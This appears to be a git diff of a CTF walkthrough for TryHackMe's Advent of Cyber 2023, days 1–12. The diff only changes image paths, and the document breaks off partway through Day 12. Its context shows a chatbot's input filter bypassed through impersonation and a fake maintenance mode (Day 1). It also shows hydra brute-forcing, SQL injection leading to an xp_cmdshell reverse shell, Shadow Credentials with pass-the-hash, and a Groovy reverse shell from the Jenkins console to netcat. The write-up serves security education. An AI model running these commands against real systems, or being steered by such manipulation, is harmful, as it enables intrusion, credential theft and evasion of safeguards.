@@ -6,7 +6,7 @@ Get started with Cyber Security in 24 Days - Learn the basics by doing a new, be
 
 Room link: https://tryhackme.com/room/adventofcyber2023
 
-![Advent of Cyber 2023 - Storyboard](/images/aoc2023_storyboard.png)
+![Advent of Cyber 2023 - Storyboard](tryhackme/images/aoc2023_storyboard.png)
 
 ### The Story
 
@@ -30,7 +30,7 @@ Opening the provided website, we are shown a ChatGPT-style prompt. Playing aroun
 
 For example, we can ask for **McGreedy's personal email address**:
 
-![Advent of Cyber 2023 Day 1 - McGreedy Email](/images/aoc2023d1_mcgreedy_email.png)
+![Advent of Cyber 2023 Day 1 - McGreedy Email](tryhackme/images/aoc2023d1_mcgreedy_email.png)
 
 ```
 t.mcgreedy@antacticrafts.thm
@@ -38,17 +38,17 @@ t.mcgreedy@antacticrafts.thm
 
 Pivoting to the trying to retrieve the password for the server room door, we see that there is some security checks involved when we supply a prompt:
 
-![Advent of Cyber 2023 Day 1 - Security Check](/images/aoc2023d1_security_check.png)
+![Advent of Cyber 2023 Day 1 - Security Check](tryhackme/images/aoc2023d1_security_check.png)
 
 We can bypass this by asking for the members of the IT department and impersonate them to retrieve the **server room password**:
 
-![Advent of Cyber 2023 Day 1 - IT Department](/images/aoc2023d1_it_dept.png)
+![Advent of Cyber 2023 Day 1 - IT Department](tryhackme/images/aoc2023d1_it_dept.png)
 
 ```
 Van Developer, v.developer@antarcticrafts.thm
 ```
 
-![Advent of Cyber 2023 Day 1 - Server Door Password](/images/aoc2023d1_server_door_password.png)
+![Advent of Cyber 2023 Day 1 - Server Door Password](tryhackme/images/aoc2023d1_server_door_password.png)
 
 ```
 BtY2S02
@@ -56,11 +56,11 @@ BtY2S02
 
 For **McGreedy's secret project**, we are given a similar response preventing us from simply viewing it. This is an interceptor which is used to check for malicious input before sending them to the chatbot:
 
-![Advent of Cyber 2023 Day 1 - Interceptor](/images/aoc2023d1_interceptor.png)
+![Advent of Cyber 2023 Day 1 - Interceptor](tryhackme/images/aoc2023d1_interceptor.png)
 
 Similarly, we can bypass this "interceptor" layer by tricking the bot into thinking it is in maintenance mode:
 
-![Advent of Cyber 2023 Day 1 - Purple Snow](/images/aoc2023d1_purple_snow.png)
+![Advent of Cyber 2023 Day 1 - Purple Snow](tryhackme/images/aoc2023d1_purple_snow.png)
 
 ```
 Purple Snow
@@ -70,7 +70,7 @@ Purple Snow
 
 Opening the `ipynb` file within Jupyter notebooks shows we are importing a network capture in the form of a CSV file, using [Python Pandas](https://pandas.pydata.org/) to convert it to a dataframe:
 
-![Advent of Cyber Day 2 - Required Code](/images/aoc2023d2_required_code.png)
+![Advent of Cyber Day 2 - Required Code](tryhackme/images/aoc2023d2_required_code.png)
 
 To retrieve the **number of packets** captured, we can use the following code:
 
@@ -79,7 +79,7 @@ packet_count = df.count()['PacketNumber']
 print(f'Number of packets captured: {packet_count}')
 ```
 
-![Advent of Cyber 2023 Day 2 - Packets Captured](/images/aoc2023d2_packets_captured.png)
+![Advent of Cyber 2023 Day 2 - Packets Captured](tryhackme/images/aoc2023d2_packets_captured.png)
 
 ```
 100
@@ -92,7 +92,7 @@ top_ip = df.groupby(['Source']).size().sort_values(ascending=False).head(1)
 print(top_ip)
 ```
 
-![Advent of Cyber 2023 Day 2 - Top IP](/images/aoc2023d2_top_ip.png)
+![Advent of Cyber 2023 Day 2 - Top IP](tryhackme/images/aoc2023d2_top_ip.png)
 
 Finally, looking at the **top protocol**, we see that ICMP was observed 27 times:
 
@@ -101,7 +101,7 @@ top_protocol = df['Protocol'].value_counts().head(1)
 print(top_protocol)
 ```
 
-![Advent of Cyber 2023 Day 2 - Top Protocol](/images/aoc2023d2_top_protocol.png)
+![Advent of Cyber 2023 Day 2 - Top Protocol](tryhackme/images/aoc2023d2_top_protocol.png)
 
 ## Day 3 - Hydra is Coming to Town
 
@@ -111,7 +111,7 @@ Opening the site on port 8000, we are presented with a PIN pad:
 
 Trying the input, we see the pad can only display a maximum of three digits:
 
-![Advent of Cyber Day 3 - Three Digits](/images/aoc2023d3_three_digits.png)
+![Advent of Cyber Day 3 - Three Digits](tryhackme/images/aoc2023d3_three_digits.png)
 
 In terms of possibilities, we have 12 possible inputs for each digit. This gives us a total of 4096 possible passwords. We can generate a list of three-digit passwords with `crunch`:
 
@@ -119,7 +119,7 @@ In terms of possibilities, we have 12 possible inputs for each digit. This gives
 $ crunch 3 3 0123456789ABCDEF -o three_digit_codes.txt
 ```
 
-![Advent of Cyber 2023 Day 3 - Crunch](/images/aoc2023d3_crunch.png)
+![Advent of Cyber 2023 Day 3 - Crunch](tryhackme/images/aoc2023d3_crunch.png)
 
 Before we bruteforce the PIN, we need to understand more about how the website operates. Looking at the source code, we see:
 
@@ -127,11 +127,11 @@ Before we bruteforce the PIN, we need to understand more about how the website o
 - The URL is `http://<VICTIM_IP>:8000/login.php`
 - The PIN code value is sent with the name `pin`
 
-![Advent of Cyber Day 3 - Source Code](/images/aoc2023d3_source_code.png)
+![Advent of Cyber Day 3 - Source Code](tryhackme/images/aoc2023d3_source_code.png)
 
 In addition, when we input an incorrect PIN, we get an `Access denied` error:
 
-![Advent of Cyber 2023 Day 3 - Access Denied](/images/aoc2023d3_access_denied.png)
+![Advent of Cyber 2023 Day 3 - Access Denied](tryhackme/images/aoc2023d3_access_denied.png)
 
 Using this information, we can craft our `hydra` command:
 
@@ -154,29 +154,29 @@ To summarise, the above:
 
 Running this will give us the PIN:
 
-![Advent of Cyber 2023 Day 3 - Hydra](/images/aoc2023d3_hydra.png)
+![Advent of Cyber 2023 Day 3 - Hydra](tryhackme/images/aoc2023d3_hydra.png)
 
 Inputting the PIN grants us access:
 
-![Advent of Cyber 2023 Day 3 - Access Granted](/images/aoc2023d3_access_granted.png)
+![Advent of Cyber 2023 Day 3 - Access Granted](tryhackme/images/aoc2023d3_access_granted.png)
 
 Unlocking the door gives us the flag:
 
-![Advent of Cyber 2023 Day 3 - Flag](/images/aoc2023d3_flag.png)
+![Advent of Cyber 2023 Day 3 - Flag](tryhackme/images/aoc2023d3_flag.png)
 
 ## Day 4 - Baby, it's CeWLd outside
 
 Opening the target site displays the following homepage:
 
-![Advent of Cyber 2023 Day 4 - Homepage](/images/aoc2023d4_homepage.png)
+![Advent of Cyber 2023 Day 4 - Homepage](tryhackme/images/aoc2023d4_homepage.png)
 
 Navigating to `/login.php`, we see a generic login form:
 
-![Advent of Cyber 2023 Day 4 - Login Form](/images/aoc2023d4_login_form.png)
+![Advent of Cyber 2023 Day 4 - Login Form](tryhackme/images/aoc2023d4_login_form.png)
 
 Submitting invalid credentials produces a `Please enter the correct credentials` error:
 
-![Advent of Cyber 2023 Day 4 - Login Error](/images/aoc2023d4_login_error.png)
+![Advent of Cyber 2023 Day 4 - Login Error](tryhackme/images/aoc2023d4_login_error.png)
 
 Using `cewl`, we can generate a wordlist based on the content of AntarctiCrafts:
 
@@ -206,25 +206,25 @@ To summarise, the above:
 
 This ultimately produces the correct `username:password` combination:
 
-![Advent of Cyber 2023 Day 4 - Credentials](/images/aoc2023d4_credentials.png)
+![Advent of Cyber 2023 Day 4 - Credentials](tryhackme/images/aoc2023d4_credentials.png)
 
 Using the credential combination `isaias:Happiness`, we can login and retrieve the flag:
 
-![Advent of Cyber 2023 Day 4 - Flag](/images/aoc2023d4_flag.png)
+![Advent of Cyber 2023 Day 4 - Flag](tryhackme/images/aoc2023d4_flag.png)
 
 ## Day 5 - A Christmas DOScovery: Tapes of Yule-tide Past
 
 Connecting to the machine and opening the `DosBox-X` emulator:
 
-![Advent of Cyber 2023 Day 5 - DosBox-X](/images/aoc2023d5_dosbox.png)
+![Advent of Cyber 2023 Day 5 - DosBox-X](tryhackme/images/aoc2023d5_dosbox.png)
 
 Running `dir`, we see we are given a few directories, a `AC2023.BAK` file of **12,704 bytes** and a `PLAN.TXT` file:
 
-![Advent of Cyber 2023 Day 5 - Dir](/images/aoc2023d5_dir.png)
+![Advent of Cyber 2023 Day 5 - Dir](tryhackme/images/aoc2023d5_dir.png)
 
 Viewing the contents of `PLAN.TXT` with `TYPE`, we can see the name of the backup file is **BackupMaster 3000**. We also see that the first few bytes of the target file's signature should be `AC` or `41 43`.
 
-![Advent of Cyber 2023 Day 5 - PLAN.TXT](/images/aoc2023d5_plan_txt.png)
+![Advent of Cyber 2023 Day 5 - PLAN.TXT](tryhackme/images/aoc2023d5_plan_txt.png)
 
 Our goal here is to restore the `AC2023.BAK` file using `BUMASTER.EXE` found in `C:\TOOLS\BACKUP`. To do this, we can run the following, however this will result in an error relating to the file signature:
 
@@ -232,43 +232,43 @@ Our goal here is to restore the `AC2023.BAK` file using `BUMASTER.EXE` found in 
 [AC] C:\> BUMASTER.EXE C:\AC2023.BAK
 ```
 
-![Advent of Cyber 2023 Day 5 - Error](/images/aoc2023d5_error.png)
+![Advent of Cyber 2023 Day 5 - Error](tryhackme/images/aoc2023d5_error.png)
 
 From the troubleshooting guide, the first few bytes of the file must be `AC` or `41 43`. 
 
 Running `EDIT` on the `AC2023.BAK` file, we see that `XX` is given as the first bytes. Changing this to `AC` and using `ALT+F` to save and quit, we can now run the backup application again with the corrected file:
 
-![Advent of Cyber 2023 Day 5 - XX](/images/aoc2023d5_xx.png)
+![Advent of Cyber 2023 Day 5 - XX](tryhackme/images/aoc2023d5_xx.png)
 
 This returns us the flag:
 
-![Advent of Cyber 2023 Day 5 - Flag](/images/aoc2023d5_flag.png)
+![Advent of Cyber 2023 Day 5 - Flag](tryhackme/images/aoc2023d5_flag.png)
 
 ## Day 6 - Memories of Christmas Past
 
 Opening `https://<VICTIM_IP>.p.thmlabs.com`, we are greeted with Tree Builder 2023:
 
-![Advent of Cyber 2023 Day 6 - Tree Builder](/images/aoc2023d6_tree_builder.png)
+![Advent of Cyber 2023 Day 6 - Tree Builder](tryhackme/images/aoc2023d6_tree_builder.png)
 
 From here, our objective is to buy the star from Van Frosty as well as any number of ornaments to decorate the tree.
 
 However, a bug has been observed in the game where once you obtain 13 coins and ask Van Holly to change your name to `scroogerocks!`, you obtain 33 coins. We can reproduce this as follows:
 
-![Advent of Cyber 2023 Day 6 - Scrooge Rocks!](/images/aoc2023d6_scroogerocks.png)
+![Advent of Cyber 2023 Day 6 - Scrooge Rocks!](tryhackme/images/aoc2023d6_scroogerocks.png)
 
-![Advent of Cyber 2023 Day 6 - Bug Reproduced](/images/aoc2023d6_bug_reproduced.png)
+![Advent of Cyber 2023 Day 6 - Bug Reproduced](tryhackme/images/aoc2023d6_bug_reproduced.png)
 
 Accessing the debug panel with `TAB`, we see that we have overflowed the buffer assigned to the `player_name` variable into the memory for the `coins` variable:
 
-![Advent of Cyber 2023 Day 6 - Debug Panel](/images/aoc2023d6_debug_panel.png)
+![Advent of Cyber 2023 Day 6 - Debug Panel](tryhackme/images/aoc2023d6_debug_panel.png)
 
 Looking at the hex debug panel, we see that `0x21` represents the `!` which is `33` when translated to decimal. Overall, this means that 12 bytes are assigned to store the contents of `player_name` and 4 bytes to store the value of `coins`.
 
 For example, if we set our name to `aaaabbbbccccd`, the final letter `d` will overflow into the space for the `coins` and give us `100` coins:
 
-![Advent of Cyber 2023 Day 6 - Further Testing](/images/aoc2023d6_further_testing.png)
+![Advent of Cyber 2023 Day 6 - Further Testing](tryhackme/images/aoc2023d6_further_testing.png)
 
-![Advent of Cyber 2023 Day 6 - 100 Coins](/images/aoc2023d6_100_coins.png)
+![Advent of Cyber 2023 Day 6 - 100 Coins](tryhackme/images/aoc2023d6_100_coins.png)
 
 Now that we've confirmed we can control the number of coins we have, we can answer the questions for the room.
 
@@ -280,7 +280,7 @@ AAAABBBBCCCCOOPS
 
 This gives us enough coins to buy the star and get the flag using the `d` ID. However, when we attempt to purchase the flag from the shopkeeper, he sees that we've cheated and produces this message:
 
-![Advent of Cyber 2023 Day 6 - Cheating](/images/aoc2023d6_cheating.png)
+![Advent of Cyber 2023 Day 6 - Cheating](tryhackme/images/aoc2023d6_cheating.png)
 
 Fortunately, not only can we control the memory contents of `coins`, but we can also overwrite the contents of `shopk_name` and `namer_name` to reach `inv_items` and give us the star.
 
@@ -294,11 +294,11 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
 
 This will give us the star which we can use to decorate the tree and get the flag:
 
-![Advent of Cyber 2023 Day 6 - Star](/images/aoc2023d6_star.png)
+![Advent of Cyber 2023 Day 6 - Star](tryhackme/images/aoc2023d6_star.png)
 
-![Advent of Cyber 2023 Day 6 - Decorated Tree](/images/aoc2023d6_decorated_tree.png)
+![Advent of Cyber 2023 Day 6 - Decorated Tree](tryhackme/images/aoc2023d6_decorated_tree.png)
 
-![Advent of Cyber 2023 Day 6 - Flag](/images/aoc2023d6_flag.png)
+![Advent of Cyber 2023 Day 6 - Flag](tryhackme/images/aoc2023d6_flag.png)
 
 ## Day 7 - 'Tis the season for log chopping
 
@@ -306,7 +306,7 @@ From observations, it is known that Tracy McGreedy has installed a CrypTOYminer 
 
 To pinpoint this activity, we are given an `access.log` file comprising proxy logs.
 
-![Advent of Cyber 2023 Day 7 - Log File](/images/aoc2023d7_log_file.png)
+![Advent of Cyber 2023 Day 7 - Log File](tryhackme/images/aoc2023d7_log_file.png)
 
 The Squid proxy logs are formatted, as such:
 
@@ -324,7 +324,7 @@ $ cut -d " " -f2 access.log | sort | uniq
 $ cut -d " " -f2 access.log | sort | uniq | wc -l
 ```
 
-![Advent of Cyber 2023 Day 7 - Unique IPs](/images/aoc2023d7_unique_ips.png)
+![Advent of Cyber 2023 Day 7 - Unique IPs](tryhackme/images/aoc2023d7_unique_ips.png)
 
 Next, we are asked to look at the number of **unique domains** that were accessed by the workstations.  To do this, we focus on field 3 in `access.log`, the `domain:port` field:
 
@@ -336,7 +336,7 @@ $ cut -d " " -f3 access.log | cut -d ":" -f1 | sort | uniq
 $ cut -d " " -f3 access.log | cut -d ":" -f1 |  sort | uniq | wc -l
 ```
 
-![Advent of Cyber 2023 Day 7 - Unique Domains](/images/aoc2023d7_unique_domains.png)
+![Advent of Cyber 2023 Day 7 - Unique Domains](tryhackme/images/aoc2023d7_unique_domains.png)
 
 
 ```console
@@ -354,7 +354,7 @@ On the other hand, looking at the high connection counts, we see that malicious 
 $ cut -d " " -f3 access.log | cut -d ":" -f1 | sort | uniq -c | sort -r | head
 ```
 
-![Advent of Cyber 2023 Day 7 - Malicious Domain](/images/aoc2023d7_malicious_domain.png)
+![Advent of Cyber 2023 Day 7 - Malicious Domain](tryhackme/images/aoc2023d7_malicious_domain.png)
 
 Using the malicious domain from the above command, we can find the IP address of the workstation which accessed it:
 
@@ -370,7 +370,7 @@ As this domain was used as exfiltration, we should pivot on the `http_uri` to se
 $ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f5
 ```
 
-![Advent of Cyber 2023 Day 7 - Exfiltrated Data](/images/aoc2023d7_exfiltrated_data.png)
+![Advent of Cyber 2023 Day 7 - Exfiltrated Data](tryhackme/images/aoc2023d7_exfiltrated_data.png)
 
 From the above, we can see that `HTTP GET` requests are being made to the malicious domain and using the `goodies` parameter to transmit data as Base64.
 
@@ -381,7 +381,7 @@ Filtering this output further so that we only get the value of `goodies`, we can
 $ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f5 | cut -d "=" -f2 | base64 -d | grep "THM{" | cut -d "," -f3
 ```
 
-![Advent of Cyber 2023 Day 7 - Flag](/images/aoc2023d7_flag.png)
+![Advent of Cyber 2023 Day 7 - Flag](tryhackme/images/aoc2023d7_flag.png)
 
 ## Day 8 - Have a Holly, Jolly Byte!
 
@@ -393,33 +393,33 @@ Typically, during a forensic investigation, such a drive would be connected to a
 
 Using FTK Imager and the USB mapped into `\\PHYSICALDRIVE2`, we can attach this as evidence via **File->Add Evidence Item**, select **Physical Drive**, and then choose the mounted drive:
 
-![Advent of Cyber 2023 Day 8 - Add Evidence Item](/images/aoc2023d8_add_evidence_item.png)
+![Advent of Cyber 2023 Day 8 - Add Evidence Item](tryhackme/images/aoc2023d8_add_evidence_item.png)
 
-![Advent of Cyber 2023 Day 8 - Physical Drive](/images/aoc2023d8_physical_drive.png)
+![Advent of Cyber 2023 Day 8 - Physical Drive](tryhackme/images/aoc2023d8_physical_drive.png)
 
 From the file structure, we see a **deleted** `DO_NOT_OPEN` directory containing numerous suspicious files. Of these files, we have `secretchat.txt` which contains a chat log between `Gr33dYsH4d0W` and `V4nd4LmUffL3r5`.
 
-![Advent of Cyber 2023 Day 8 - secretchat.txt](/images/aoc2023d8_secretchat_txt.png)
+![Advent of Cyber 2023 Day 8 - secretchat.txt](tryhackme/images/aoc2023d8_secretchat_txt.png)
 
 Within this chat, there is reference to the **malware C2 server**, `mcgreedysecretc2.thm`, configured by `Gr33dYsH4d0W`:
 
-![Advent of Cyber 2023 Day 8 - C2 Server](/images/aoc2023d8_c2_server.png)
+![Advent of Cyber 2023 Day 8 - C2 Server](tryhackme/images/aoc2023d8_c2_server.png)
 
 Pivoting to the deleted `JuicyTomaTOY.zip` file, we find an embedded `JuicyTomaTOY.exe` file:
 
-![Advent of Cyber 2023 Day 8 - Deleted Zip](/images/aoc2023d8_deleted_zip.png)
+![Advent of Cyber 2023 Day 8 - Deleted Zip](tryhackme/images/aoc2023d8_deleted_zip.png)
 
 Pivoting back to the root of the USB, we note two deleted PNG files. Using `CTRL+F` to search the contents of these files, we can find a flag within `portait.png`:
 
-![Advent of Cyber 2023 Day 8 - Flag](/images/aoc2023d8_flag.png)
+![Advent of Cyber 2023 Day 8 - Flag](tryhackme/images/aoc2023d8_flag.png)
 
 Finally, we can obtain the SHA1 file hash of the disk image through **File->Verify Drive/Image**:
 
-![Advent of Cyber 2023 Day 8 - Verify](/images/aoc2023d8_verify.png)
+![Advent of Cyber 2023 Day 8 - Verify](tryhackme/images/aoc2023d8_verify.png)
 
 Once complete, this will produce the MD5 and **SHA1** hash of the filesystem:
 
-![Advent of Cyber 2023 Day 8 - SHA1](/images/aoc2023d8_sha1.png)
+![Advent of Cyber 2023 Day 8 - SHA1](tryhackme/images/aoc2023d8_sha1.png)
 
 ## Day 9 - She sells C# shells by the C2shore
 
@@ -431,7 +431,7 @@ For our purposes, this means that the binary can be decompiled to its (near) sou
 
 Opening the file in DnSpy, we are presented with the `Main` program:
 
-![Advent of Cyber 2023 Day 9 - Main](/images/aoc2023d9_main.png)
+![Advent of Cyber 2023 Day 9 - Main](tryhackme/images/aoc2023d9_main.png)
 
 There are various functions defined within this program that are listed under `Program @02000002`.
 
@@ -443,21 +443,21 @@ Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like G
 
 Relating this back to the flow of the program, we can see that `http://mcgreedysecretc2.thm/reg` is the first URL used by the malware:
 
-![Advent of Cyber 2023 Day 9 - First URL](/images/aoc2023d9_first_url.png)
+![Advent of Cyber 2023 Day 9 - First URL](tryhackme/images/aoc2023d9_first_url.png)
 
 There are also two functions which utilise AES for encryption and decryption - `Encryptor` and `Decryptor`. Analysing the file shows that the key is hardcoded:
 
-![Advent of Cyber 2023 Day 9 - Key](/images/aoc2023d9_key.png)
+![Advent of Cyber 2023 Day 9 - Key](tryhackme/images/aoc2023d9_key.png)
 
 The `Sleeper` function makes a call to `Thread.Sleep` using the integer `count` which is set to the value `15000` (milliseconds) - **15 seconds**.
 
 Again, looking at the flow of the program, we can see the malware accepts commands in order to interact with an infected host.  For example, the `shell` command is used to execute commands via `cmd.exe`:
 
-![Advent of Cyber 2023 Day 9 - Shell Command](/images/aoc2023d9_shell_command.png)
+![Advent of Cyber 2023 Day 9 - Shell Command](tryhackme/images/aoc2023d9_shell_command.png)
 
 Looking further at the command functionality, if the `implant` command is supplied, the `stash.mcgreedy.thm` domain is used to download a supplementary binary, `spykit.exe`:
 
-![Advent of Cyber 2023 Day 9 - Implant Functionality](/images/aoc2023d9_implant_functionality.png)
+![Advent of Cyber 2023 Day 9 - Implant Functionality](tryhackme/images/aoc2023d9_implant_functionality.png)
 
 ## Day 10 - Inject the Halls with EXEC Queries
 
@@ -467,23 +467,23 @@ During their initial investigation, Elf Forensic McBlue discovered a forum post 
 
 Navigating to the website, we are greeted with the defaced Best Festival Company homepage:
 
-![Advent of Cyber 2023 Day 10 - Defaced Homepage](/images/aoc2023d10_defaced_homepage.png)
+![Advent of Cyber 2023 Day 10 - Defaced Homepage](tryhackme/images/aoc2023d10_defaced_homepage.png)
 
 Manually crawling the website, we come across an input form allowing us to search the site for gifts:
 
-![Advent of Cyber 2023 Day 10 - Start Search](/images/aoc2023d10_start_search.png)
+![Advent of Cyber 2023 Day 10 - Start Search](tryhackme/images/aoc2023d10_start_search.png)
 
-![Advent of Cyber 2023 Day 10 - Input Form](/images/aoc2023d10_input_form.png)
+![Advent of Cyber 2023 Day 10 - Input Form](tryhackme/images/aoc2023d10_input_form.png)
 
 From the above form, we can input information about three main attributes: `age`, `interests`, and `budget`. Filling the form with arbitrary information and submitting redirects us to a results page with our parameters populated within the URL:
 
-![Advent of Cyber 2023 Day 10 - URL Parameters](/images/aoc2023d10_url_params.png)
+![Advent of Cyber 2023 Day 10 - URL Parameters](tryhackme/images/aoc2023d10_url_params.png)
 
 So, we can hypothesise that the underlying PHP code which handles the form takes three parameters, specifically `age`, `interests`, and `budget` and performs a query against the database to retrieve the filtered results which is then outputted to the page via `giftresults.php`.
 
 To test if this functionality is vulnerable, we can place a single quote (`'`) as one of the parameter values and submit the form. This results in the following error:
 
-![Advent of Cyber 2023 Day 10 - Form Error](/images/aoc2023d10_form_error.png)
+![Advent of Cyber 2023 Day 10 - Form Error](tryhackme/images/aoc2023d10_form_error.png)
 
 Based on this, we can attempt to visualise what the backend PHP looks like:
 
@@ -502,7 +502,7 @@ $result = sqlsrv_query($conn, $query);
 
 As such, we can utilise the `' OR 1=1 --`payload to retrieve all gifts. Scrolling to the bottom of the results, we get the first flag:
 
-![Advent of Cyber 2023 Day 10 - First Flag](/images/aoc2023d10_first_flag.png)
+![Advent of Cyber 2023 Day 10 - First Flag](tryhackme/images/aoc2023d10_first_flag.png)
 
 Now that we can successfully exploit this vulnerability, we can attempt to get a shell on the system. From our initial testing, we discovered that the system is running a **Microsoft SQL Server**. Within this software is a stored procedure called [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) which spawns a Windows command shell and can be manually enabled with the SQL `EXECUTE`, or `EXEC`, command.
 
@@ -537,21 +537,21 @@ Finally, we need to actually run the reverse shell and catch the callback with N
 '; EXEC xp_cmdshell 'C:\Windows\Temp\reverse_shell.exe'; --
 ```
 
-![Advent of Cyber 2023 Day 10 - Netcat Callback](/images/aoc2023d10_netcat_callback.png)
+![Advent of Cyber 2023 Day 10 - Netcat Callback](tryhackme/images/aoc2023d10_netcat_callback.png)
 
 Searching through the system, we see we have a `Administrator` user with suspicious files in their `Desktop` directory:
 
-![Advent of Cyber 2023 Day 10 - Admin Desktop](/images/aoc2023d10_admin_desktop.png)
+![Advent of Cyber 2023 Day 10 - Admin Desktop](tryhackme/images/aoc2023d10_admin_desktop.png)
 
 Looking at `Note.txt`, we can see this is instructions for how to run the `deface_website.bat` script but also the `restore_website.bat` script:
 
-![Advent of Cyber 2023 Day 10 - Note.txt](/images/aoc2023d10_note_txt.png)
+![Advent of Cyber 2023 Day 10 - Note.txt](tryhackme/images/aoc2023d10_note_txt.png)
 
 Running the `restore_website.bat` file shows that our final flag is on `index.php`:
 
-![Advent of Cyber 2023 Day 10 - Restore Website](/images/aoc2023d10_restore_website.png)
+![Advent of Cyber 2023 Day 10 - Restore Website](tryhackme/images/aoc2023d10_restore_website.png)
 
-![Advent of Cyber 2023 Day 10 - Final Flag](/images/aoc2023d10_final_flag.png)
+![Advent of Cyber 2023 Day 10 - Final Flag](tryhackme/images/aoc2023d10_final_flag.png)
 
 ## Day 11 - Jingle Bells, Shadow Spells
 
@@ -563,7 +563,7 @@ For proper security practice, an ideal configuration would adopt the Principle o
 
 In addition, to replace password authentication, Windows also introduced Windows Hello for Business (WHfB), which uses cryptographic keys for user verification that are connected to a known PIN (or biometrics) which is known to the user. The Domain Controller utilises the `msDS-KeyCredentialLink` attribute to store the public key in WHfB.
 
-![Advent of Cyber 2023 Day 11 - Windows Hello](/images/aoc2023d11_windows_hello.png)
+![Advent of Cyber 2023 Day 11 - Windows Hello](tryhackme/images/aoc2023d11_windows_hello.png)
 
 To store a new set, or pair, of certificates in WHfB:
 
@@ -577,11 +577,11 @@ To authenticate:
 2) The Domain Controller then generates a certificate which is sent back to the client
 3) The client can now log into the Active Directory domain with this certificate
 
-![Advent of Cyber 2023 Day 11 - WHfB Authentication Procedure](/images/aoc2023d11_whfb_auth_procedure.png)
+![Advent of Cyber 2023 Day 11 - WHfB Authentication Procedure](tryhackme/images/aoc2023d11_whfb_auth_procedure.png)
 
 From our provided system, we can enumerate for security misconfigurations in these systems with the `PowerView.ps1` script on the `hr` user's `Desktop`. We first have to load the script into memory and also bypass the default PowerShell script execution policy in order to properly execute commands:
 
-![Advent of Cyber 2023 Day 11 - PowerView Load](/images/aoc2023d11_powerview_load.png)
+![Advent of Cyber 2023 Day 11 - PowerView Load](tryhackme/images/aoc2023d11_powerview_load.png)
 
 First, we will enumerate our current user's privileges:
 
@@ -589,7 +589,7 @@ First, we will enumerate our current user's privileges:
 PS > Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
 ```
 
-![Advent of Cyber 2023 Day 11 - User Privileges](/images/aoc2023d11_user_privileges.png)
+![Advent of Cyber 2023 Day 11 - User Privileges](tryhackme/images/aoc2023d11_user_privileges.png)
 
 From the above output, we can see the `hr` user has the `GenericWrite` permission over the `vansprinkles` object. As such, we can compromise this account with that privilege by updating the `msDS-KeyCredentialLink` attribute - this is known as a **Shadow Credentials** attack.
 
@@ -599,7 +599,7 @@ To exploit this vulnerability, we can use `Whisker.exe` which will simulate the 
 PS > .\Whisker.exe add /target:vansprinkles
 ```
 
-![Advent of Cyber 2023 Day 11 - Whisker](/images/aoc2023d11_whisker.png)
+![Advent of Cyber 2023 Day 11 - Whisker](tryhackme/images/aoc2023d11_whisker.png)
 
 This gives us the ability to impersonate the vulnerable user via `Rubeus.exe`. Overall, we are carrying out a **pass-the-hash** attack. With our valid certificate we have obtained, we can acquire a valid TGT (Ticket Granting Ticket) and impersonate the user.
 
@@ -607,7 +607,7 @@ This gives us the ability to impersonate the vulnerable user via `Rubeus.exe`. O
 PS > Rubeus.exe asktgt /user:vansprinkles /certificate:<CERTIFICATE> /password:"Aq9Y4X8IbcFXiVVP" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
 ```
 
-![Advent of Cyber 2023 Day 11 - TGT](/images/aoc2023d11_tgt.png)
+![Advent of Cyber 2023 Day 11 - TGT](tryhackme/images/aoc2023d11_tgt.png)
 
 From the above, we have successfully obtained a TGT for the `vansprinkles` user. As such, we can now carry out a **pass-the-hash** attack via `evil-winrm`, the username and NTLM hash, as follows:
 
@@ -615,7 +615,7 @@ From the above, we have successfully obtained a TGT for the `vansprinkles` user.
 $ evil-winrm -i 10.10.196.229 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
 ```
 
-![Advent of Cyber 2023 Day 11 - Evil-WinRM](/images/aoc2023d11_evil_winrm.png)
+![Advent of Cyber 2023 Day 11 - Evil-WinRM](tryhackme/images/aoc2023d11_evil_winrm.png)
 
 We can now retrieve the file on the `Administrator` user's `Desktop`:
 
@@ -624,7 +624,7 @@ PS > Get-ChildItem C:\Users\Administrator\Desktop
 PS > Get-Content C:\Users\Administrator\Desktop\flag.txt
 ```
 
-![Advent of Cyber 2023 Day 11 - Flag](/images/aoc2023d11_flag.png)
+![Advent of Cyber 2023 Day 11 - Flag](tryhackme/images/aoc2023d11_flag.png)
 
 ## Day 12 - Sleighing Threats, One Layer at a Time
 
@@ -632,13 +632,13 @@ Due to the recent merger, the company's security posture has reduced dramaticall
 
 Navigating to `http://<VICTIM_IP>:8080`, we are shown a Jenkins dashboard:
 
-![Advent of Cyber 2023 Day 12 - Jenkins Dashboard](/images/aoc2023d12_jenkins_dashboard.png)
+![Advent of Cyber 2023 Day 12 - Jenkins Dashboard](tryhackme/images/aoc2023d12_jenkins_dashboard.png)
 
 Clicking on **Manage Jenkins** on the left navigation bar and scrolling down, we can utilise **Script Console** to run arbitrary code on the system:
 
-![Advent of Cyber 2023 Day 12 - Script Console](/images/aoc2023d12_script_console.png)
+![Advent of Cyber 2023 Day 12 - Script Console](tryhackme/images/aoc2023d12_script_console.png)
 
-![Advent of Cyber 2023 Day 12 - Groovy Console](/images/aoc2023d12_groovy_console.png)
+![Advent of Cyber 2023 Day 12 - Groovy Console](tryhackme/images/aoc2023d12_groovy_console.png)
 
 This console utilises [Apache Groovy](https://www.groovy-lang.org/), a powerful language commonly utilised in developer / devops environments for enhancing productivity. We can therefore craft a [reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) and gain access to the host:
 
@@ -654,23 +654,23 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 $ nc -nvlp <PORT>
 ```
 
-![Advent of Cyber 2023 Day 12 - Netcat Callback](/images/aoc2023d12_nc_callback.png)
+![Advent of Cyber 2023 Day 12 - Netcat Callback](tryhackme/images/aoc2023d12_nc_callback.png)
 
 From executing the above, we get a callback on our `nc` listener as the `jenkins` user.
 
 Exploring the system, we find a `backup.sh` file within `/opt/scripts` which contains credentials to the `tracy` user:
 
